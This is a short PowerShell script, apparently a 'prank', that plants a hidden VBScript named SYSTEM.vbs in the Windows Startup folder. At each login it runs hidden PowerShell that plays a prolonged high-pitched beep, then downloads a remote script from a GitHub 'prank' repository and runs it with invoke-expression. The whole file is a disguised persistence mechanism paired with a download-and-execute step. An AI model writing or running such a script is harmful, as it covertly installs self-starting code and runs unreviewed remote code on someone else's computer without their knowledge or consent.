cd 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
New-Item 'SYSTEM.vbs' -ItemType File
$content = 'Set objShell = CreateObject("WScript.Shell"):objShell.Run("powershell.exe -w h  $BeepList = @(@{ Pitch = 32767; Length = 900000; };);foreach ($Beep in $BeepList) {[System.Console]::Beep($Beep[''Pitch''], $Beep[''Length'']);}"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Volume.ps1; invoke-expression $pl")' | out-file -filepath SYSTEM.vbs
